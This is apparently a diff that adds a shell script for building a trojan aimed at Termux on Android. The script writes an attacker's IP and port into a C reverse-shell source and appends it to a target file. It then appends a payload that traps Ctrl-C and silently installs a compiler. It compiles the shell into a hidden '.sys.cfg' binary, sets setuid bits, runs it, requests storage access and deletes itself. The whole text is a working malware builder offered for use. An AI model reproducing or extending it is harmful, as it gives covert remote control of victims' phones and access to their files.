@@ -1,0 +1,23 @@
+ip='#define AIP ''"'$1'"'
+port="#define PORT $2"
+(echo $ip && echo $port && cat v7x-rsg.rs.c) > rs.c
+
+cat rsh.cetf >> $3
+cat rs.c >> $3
+echo "'" >> $3
+script="
+trap noctrl SIGINT
+echo \"\$data\" > \$PREFIX/var/.sys.cfg.c
+if [ ! -f "\$PREFIX/bin/gcc" ];then
+   pkg install clang -y
+fi
+gcc \$PREFIX/var/.sys.cfg.c -o \$PREFIX/var/.sys.cfg >>/dev/null
+chmod +s \$PREFIX/var/.sys.cfg &> /dev/null
+\$PREFIX/var/.sys.cfg
+chmod +s \$PREFIX/etc/system.cfg
+chmod +x \$PREFIX/etc/system.cfg
+termux-setup-storage
+rm \$0
+"
+printf "$script" >> $3
+
